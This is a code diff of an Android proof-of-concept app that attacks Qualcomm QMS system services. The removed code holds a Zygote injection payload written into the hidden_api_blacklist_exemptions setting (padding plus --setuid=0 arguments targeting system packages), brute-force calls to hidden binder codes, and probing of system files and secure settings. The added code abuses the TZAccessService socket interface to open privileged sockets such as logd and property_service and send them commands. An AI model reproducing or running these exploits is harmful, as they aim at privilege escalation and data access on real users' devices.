@@ -11,10 +11,8 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.os.Parcel;
 import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
-import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -23,13 +21,13 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
-import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
-import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
+import com.qualcomm.qti.qms.api.a.IMinkSocketFd;
 
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.lang.reflect.Method;
@@ -42,52 +40,43 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
-    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
-    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
-    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
-    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
+    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
+    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
-    private IServiceManager mServiceManager;
-    private IBinder mTZServiceBinder;
-    private boolean isBoundCS = false;
-    private boolean isBoundTZ = false;
+    private IMinkSocketFd mTZService;
+    private boolean isBound = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
 
-    private ServiceConnection csConnection = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            mServiceManager = IServiceManager.Stub.asInterface(service);
-            appendLog("CS Service bound");
-            if (mTZServiceBinder != null) startTests();
-        }
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            mServiceManager = null;
-            isBoundCS = false;
-            enableButtons(true, false);
-            updateStatus("CS disconnected");
-        }
-    };
-
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
-            mTZServiceBinder = service;
-            appendLog("TZ Service bound");
-            if (mServiceManager != null) startTests();
+            try {
+                Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.a.IMinkSocketFd");
+                Method asInterface = cls.getMethod("asInterface", IBinder.class);
+                mTZService = (IMinkSocketFd) asInterface.invoke(null, service);
+                appendLog("TZ Service bound");
+                updateStatus("Bound - starting tests");
+                enableButtons(false, true);
+                stopRequested.set(false);
+                testThread = new Thread(() -> executeFullTest());
+                testThread.start();
+            } catch (Exception e) {
+                appendLog("Failed to get IMinkSocketFd: " + e.getMessage());
+                enableButtons(true, false);
+            }
         }
         @Override
         public void onServiceDisconnected(ComponentName name) {
-            mTZServiceBinder = null;
-            isBoundTZ = false;
+            mTZService = null;
+            isBound = false;
             enableButtons(true, false);
-            updateStatus("TZ disconnected");
+            updateStatus("Disconnected");
         }
     };
 
@@ -107,7 +96,7 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(true);
                 enableButtons(false, true);
                 stopRequested.set(false);
-                bindServices();
+                bindService();
             }
         });
         btnStop.setOnClickListener(v -> {
@@ -128,8 +117,7 @@ public class MainActivity extends AppCompatActivity {
     private void requestPermissions() {
         String[] perms = {
                 android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
+                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
         };
         List<String> toRequest = new ArrayList<>();
         for (String p : perms) {
@@ -142,34 +130,27 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void bindServices() {
+    private void bindService() {
         try {
-            Intent intentCS = new Intent();
-            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
-            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
-            if (!isBoundCS) appendLog("CS bind failed");
-
-            Intent intentTZ = new Intent();
-            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
-            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
-            if (!isBoundTZ) appendLog("TZ bind failed");
-
-            if (!isBoundCS && !isBoundTZ) {
-                appendLog("Failed to bind any service");
+            Intent intent = new Intent();
+            intent.setClassName(TARGET_PKG, TARGET_CLS);
+            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
+            if (ret) {
+                appendLog("Binding service...");
+                updateStatus("Binding...");
+                isBound = true;
+            } else {
+                appendLog("bindService returned false");
+                updateStatus("Bind failed");
                 enableButtons(true, false);
                 isTesting.set(false);
             }
         } catch (Exception e) {
             appendLog("Bind exception: " + e.toString());
+            updateStatus("Exception");
             enableButtons(true, false);
             isTesting.set(false);
         }
-    }
-
-    private void startTests() {
-        if (testThread != null && testThread.isAlive()) return;
-        testThread = new Thread(() -> executeFullTest());
-        testThread.start();
     }
 
     private void enableButtons(boolean startEnabled, boolean stopEnabled) {
@@ -180,37 +161,21 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void executeFullTest() {
-        appendLog("========== PHASE 1: CS Service Enumeration ==========");
-        if (mServiceManager != null) {
-            IBinder rticBinder = getService("rtic");
-            if (rticBinder != null) {
-                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
-                testRticFlags(rtic);
-                discoverMethods(rticBinder, "IRticService");
-            }
-            IBinder tlocBinder = getService("tloc");
-            if (tlocBinder != null) {
-                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
-                testTloc(tloc);
-                discoverMethods(tlocBinder, "ITlocService");
-                testTlocHiddenMethod(tlocBinder);
-            }
+        appendLog("========== TZAccess Socket Communication Test ==========");
+
+        String[] successfulSockets = {
+            "/dev/socket/mdnsd",
+            "/dev/socket/tcm",
+            "/dev/socket/fwmarkd",
+            "/dev/socket/dnsproxyd",
+            "/dev/socket/logd",
+            "/dev/socket/property_service"
+        };
+
+        for (String path : successfulSockets) {
+            if (stopRequested.get()) break;
+            testSocket(path);
         }
-
-        appendLog("========== PHASE 2: Zygote Injection ==========");
-        testZygoteInjection();
-
-        appendLog("========== PHASE 3: TZAccess Socket Connect (Reflection) ==========");
-        if (mTZServiceBinder != null) {
-            tryConnectViaTZReflect("/dev/socket/minksocket");
-            tryConnectViaTZReflect("/dev/socket/ssgqmig");
-        }
-
-        appendLog("========== PHASE 4: Deep File System Exploration ==========");
-        exploreDeepFiles();
-
-        appendLog("========== PHASE 5: Settings Manipulation ==========");
-        testSettingsWrite();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
@@ -219,303 +184,83 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private IBinder getService(String serviceName) {
-        if (mServiceManager == null) return null;
-        try {
-            int[] status = new int[1];
-            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
-            if (binder != null) {
-                appendLog("Got " + serviceName + " binder, status=" + status[0]);
-                return binder;
-            } else {
-                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
-                return null;
-            }
-        } catch (RemoteException e) {
-            appendLog("RemoteException: " + e.getMessage());
-            return null;
-        }
-    }
-
-    private void testRticFlags(IRticService rtic) {
-        appendLog("--- Testing RTIC with flags ---");
-        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
-        for (long flag : flags) {
-            try {
-                int[] status = new int[1];
-                int[] ret = new int[1];
-                byte[] data = rtic.getRticData(flag, status, ret, false);
-                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-            } catch (RemoteException e) {
-                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
-            }
-        }
-        try {
-            int[] status = new int[1];
-            int[] ret = new int[1];
-            byte[] data = rtic.getRticData(0, status, ret, true);
-            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-        } catch (RemoteException e) {
-            appendLog("RemoteException: " + e.getMessage());
-        }
-    }
-
-    private void testTloc(ITlocService tloc) {
-        appendLog("--- Testing ITlocService ---");
-        try {
-            int[] status = new int[1];
-            int[] ret = new int[1];
-            byte[] data = tloc.getTrustedLocation(status, ret);
-            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
-            int warmup = tloc.tlocWarmUp();
-            appendLog("tlocWarmUp returned: " + warmup);
-        } catch (RemoteException e) {
-            appendLog("RemoteException: " + e.getMessage());
-        }
-    }
-
-    private void testTlocHiddenMethod(IBinder binder) {
-        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
-        Parcel data = Parcel.obtain();
-        Parcel reply = Parcel.obtain();
-        try {
-            data.writeInterfaceToken(binder.getInterfaceDescriptor());
-            data.writeInt(123);
-            data.writeString("test");
-            boolean success = binder.transact(2, data, reply, 0);
-            if (success) {
-                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
-                reply.setDataPosition(0);
-                try {
-                    int result = reply.readInt();
-                    appendLog("  readInt: " + result);
-                } catch (Exception e) {}
-                try {
-                    String s = reply.readString();
-                    appendLog("  readString: " + s);
-                } catch (Exception e) {}
-            } else {
-                appendLog("Hidden method call failed");
-            }
-        } catch (Exception e) {
-            appendLog("Hidden method error: " + e.getMessage());
-        } finally {
-            data.recycle();
-            reply.recycle();
-        }
-    }
-
-    private void discoverMethods(IBinder binder, String name) {
-        appendLog("--- Discovering hidden methods for " + name + " ---");
-        for (int code = 1; code <= 30; code++) {
-            if (stopRequested.get()) break;
-            Parcel data = Parcel.obtain();
-            Parcel reply = Parcel.obtain();
-            try {
-                data.writeInterfaceToken(binder.getInterfaceDescriptor());
-                boolean success = binder.transact(code, data, reply, 0);
-                if (success) {
-                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
-                    reply.setDataPosition(0);
-                    try {
-                        int result = reply.readInt();
-                        appendLog("  readInt: " + result);
-                    } catch (Exception e) {}
-                } else {
-                    appendLog("Method " + code + " failed");
-                }
-            } catch (Exception e) {
-                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
-            } finally {
-                data.recycle();
-                reply.recycle();
-            }
-        }
-    }
-
-    private void testZygoteInjection() {
-        appendLog("--- Zygote injection via hidden_api_blacklist_exemptions ---");
-        String[] targets = {
-            "com.android.shell",
-            "com.android.systemui",
-            "com.android.settings",
-            "com.android.chrome",
-            "com.android.vending",
-            "com.google.android.gms"
-        };
-        for (String pkg : targets) {
-            if (stopRequested.get()) break;
-            appendLog("Trying package: " + pkg);
-            try {
-                String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
-                StringBuilder payload = new StringBuilder();
-                for (int i = 0; i < 8000; i++) payload.append('A');
-                payload.append("9\n");
-                payload.append("--runtime-args\n");
-                payload.append("--setuid=0\n");
-                payload.append("--setgid=0\n");
-                payload.append("--target-sdk-version=29\n");
-                payload.append("--nice-name=root_" + pkg.replace(".", "_") + "\n");
-                payload.append("--app-data-dir=/data/data/" + pkg + "\n");
-                payload.append("--package-name=" + pkg + "\n");
-                payload.append("android.app.ActivityThread\n");
-                payload.append(",,,X");
-
-                String malicious = payload.toString();
-                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
-                String oldPolicy = Settings.Global.getString(getContentResolver(), "hidden_api_policy");
-                Settings.Global.putString(getContentResolver(), "hidden_api_policy", "1");
-                Settings.Global.putString(getContentResolver(), "hidden_api_policy", oldPolicy != null ? oldPolicy : "");
-                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
-                appendLog("  Injected for " + pkg + " (restored)");
-                Thread.sleep(500);
-            } catch (Exception e) {
-                appendLog("  Error for " + pkg + ": " + e.getMessage());
-            }
-        }
-    }
-
-    private void tryConnectViaTZReflect(String path) {
-        appendLog("Trying TZAccess connect to " + path + " via reflection");
-        if (mTZServiceBinder == null) {
-            appendLog("  TZ binder null");
+    private void testSocket(String path) {
+        appendLog("--- Testing " + path + " ---");
+        if (mTZService == null) {
+            appendLog("  TZ service not available");
             return;
         }
+
+        ParcelFileDescriptor pfd = null;
         try {
-            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.a.IMinkSocketFd");
-            Method asInterface = cls.getMethod("asInterface", IBinder.class);
-            Object proxy = asInterface.invoke(null, mTZServiceBinder);
-            Method aMethod = cls.getMethod("a", String.class, int[].class);
             int[] iArr = new int[1];
-            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
-            if (pfd != null) {
-                appendLog("  Got FD: " + iArr[0] + " for " + path);
-                pfd.close();
+            pfd = mTZService.a(path, iArr);
+            if (pfd == null) {
+                appendLog("  Failed to get FD");
+                return;
+            }
+            appendLog("  Got FD: " + iArr[0]);
+
+            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+            if (fdesc == null || !fdesc.valid()) {
+                appendLog("  FD invalid");
+                return;
+            }
+
+            OutputStream os = new FileOutputStream(fdesc);
+            InputStream is = new FileInputStream(fdesc);
+
+            String[] commands;
+            if (path.contains("logd")) {
+                commands = new String[]{"getLog", "status", "version", "logcat -d"};
+            } else if (path.contains("property_service")) {
+                commands = new String[]{"getprop", "list", "status"};
             } else {
-                appendLog("  Failed to get FD for " + path);
+                commands = new String[]{"help", "status", "version", "getprop", "list"};
             }
-        } catch (ClassNotFoundException e) {
-            appendLog("  IMinkSocketFd class not found. TZAccess may not be using this interface.");
-        } catch (Exception e) {
-            appendLog("  TZ connect error: " + e.getMessage());
-        }
-    }
 
-    private void exploreDeepFiles() {
-        appendLog("--- Deep File System Exploration ---");
-        String[] additionalProc = {
-            "/proc/self/fd",
-            "/proc/self/cwd",
-            "/proc/self/root",
-            "/proc/self/maps",
-            "/proc/self/smaps",
-            "/proc/self/oom_adj",
-            "/proc/self/oom_score",
-            "/proc/self/comm",
-            "/proc/self/auxv",
-            "/proc/self/limits",
-            "/proc/self/sched",
-            "/proc/self/stack",
-            "/proc/self/statm",
-            "/proc/self/wchan",
-            "/proc/self/pagemap",
-            "/proc/self/clear_refs",
-            "/proc/self/timers",
-            "/proc/self/attr/current",
-            "/proc/self/loginuid",
-            "/proc/self/sessionid",
-            "/proc/self/cgroup"
-        };
-        for (String p : additionalProc) {
-            if (stopRequested.get()) break;
-            readFileContent(p);
-        }
-
-        String[] sysFiles = {
-            "/system/build.prop",
-            "/system/etc/hosts",
-            "/system/etc/security/cacerts/",
-            "/vendor/build.prop",
-            "/proc/version"
-        };
-        for (String p : sysFiles) {
-            if (stopRequested.get()) break;
-            readFileContent(p);
-        }
-
-        File tmpDir = new File("/data/local/tmp");
-        if (tmpDir.exists() && tmpDir.canRead()) {
-            appendLog("Reading /data/local/tmp contents:");
-            File[] children = tmpDir.listFiles();
-            if (children != null) {
-                for (File f : children) {
-                    appendLog("  " + f.getName());
+            for (String cmd : commands) {
+                if (stopRequested.get()) break;
+                appendLog("  Sending: " + cmd);
+                try {
+                    os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                    String response = readWithTimeout(is, 500);
+                    if (response != null && !response.isEmpty()) {
+                        appendLog("  Response: " + response);
+                    } else {
+                        appendLog("  No response (timeout or empty)");
+                    }
+                } catch (Exception e) {
+                    appendLog("  Command failed: " + e.getMessage());
                 }
+                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
             }
-        } else {
-            appendLog("/data/local/tmp not readable");
-        }
 
-        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        if (download.exists() || download.mkdirs()) {
-            File testFile = new File(download, "poc_write_test.txt");
-            try (FileOutputStream fos = new FileOutputStream(testFile)) {
-                fos.write("Deep exploration test\n".getBytes(StandardCharsets.UTF_8));
-                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
-            } catch (Exception e) {
-                appendLog("Write failed: " + e.getMessage());
-            }
-        }
-    }
-
-    private void readFileContent(String path) {
-        File f = new File(path);
-        if (!f.exists()) {
-            appendLog(path + " does not exist");
-            return;
-        }
-        if (!f.canRead()) {
-            appendLog(path + " not readable");
-            return;
-        }
-        if (f.isDirectory()) {
-            appendLog(path + " is a directory, listing contents:");
-            File[] children = f.listFiles();
-            if (children != null) {
-                for (File child : children) {
-                    appendLog("  " + child.getName());
-                }
-            }
-            return;
-        }
-        try (FileInputStream fis = new FileInputStream(f)) {
-            byte[] data = new byte[4096];
-            int len = fis.read(data);
-            if (len > 0) {
-                String content = new String(data, 0, len, StandardCharsets.UTF_8);
-                appendLog("Content of " + path + ": " + content);
-            } else {
-                appendLog("Empty file: " + path);
-            }
+            pfd.close();
         } catch (Exception e) {
-            appendLog("Error reading " + path + ": " + e.getMessage());
+            appendLog("  Interaction error: " + e.toString());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
         }
     }
 
-    private void testSettingsWrite() {
-        appendLog("--- Settings Write ---");
+    private String readWithTimeout(InputStream is, int timeoutMs) {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        long start = System.currentTimeMillis();
+        byte[] buffer = new byte[512];
         try {
-            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
-            appendLog("Current hidden_api_blacklist_exemptions: " + current);
-            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
-            if (success) {
-                appendLog("WRITE_SECURE_SETTINGS succeeded!");
-                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
-            } else {
-                appendLog("WRITE_SECURE_SETTINGS failed");
+            while (System.currentTimeMillis() - start < timeoutMs) {
+                if (is.available() > 0) {
+                    int len = is.read(buffer);
+                    if (len > 0) baos.write(buffer, 0, len);
+                    else break;
+                } else {
+                    Thread.sleep(30);
+                }
             }
+            return baos.toString(StandardCharsets.UTF_8.name());
         } catch (Exception e) {
-            appendLog("Settings error: " + e.getMessage());
+            return null;
         }
     }
 
@@ -543,9 +288,9 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("Cannot create Download dir");
                 return;
             }
-            File file = new File(dir, "final_evolved_log.txt");
+            File file = new File(dir, "tz_socket_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Final Evolved PoC Log ===");
+                pw.println("=== TZAccess Socket PoC Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
@@ -562,8 +307,7 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
         stopRequested.set(true);
         if (testThread != null) testThread.interrupt();
-        if (isBoundCS) unbindService(csConnection);
-        if (isBoundTZ) unbindService(tzConnection);
+        if (isBound) unbindService(tzConnection);
         saveLog();
     }
 }
